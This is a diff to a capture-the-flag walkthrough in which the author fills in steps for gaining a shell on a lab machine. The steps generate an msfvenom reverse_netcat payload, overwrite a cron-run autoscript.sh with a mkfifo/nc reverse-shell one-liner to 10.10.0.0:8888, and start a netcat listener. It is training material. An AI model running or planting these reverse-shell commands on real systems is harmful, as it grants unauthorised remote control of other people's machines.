@@ -66,11 +66,11 @@ password = password
 [ ! ] You can find the answer by using 
 - msfvenom -h
 
-### 4 Create a payload using: 
+### 4 Create a payload using: msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 
 [ ! ] Reminder, LOCALIP depends on your own machine, I will be using 10.10.0.0 as an example! In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener is also set to 1234
 
-- msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+- msfvenom -p cmd/unix/reverse_netcat lhost=10.10.0.0 lport=8888 R
 ![1](https://user-images.githubusercontent.com/69840849/90489384-8f08bf00-e180-11ea-9dcc-e3927b6bf169.png)
 
 ### 5 What directory is the "autoscript.sh" under?
@@ -83,7 +83,8 @@ password = password
 - echo "mkfifo /tmp/qjqlxog; nc 10.10.0.0 8888 0</tmp/qjqlxog | /bin/sh >/tmp/qjqlxog 2>&1; rm /tmp/qjqlxog" > autoscript.sh
 
 
-### 7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using:
+### 7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvp 8888" and wait for our shell to land!
+
 - nc -lnvp 8888
 ![1](https://user-images.githubusercontent.com/69840849/90490101-895fa900-e181-11ea-8166-ca5a4a637815.png)
 
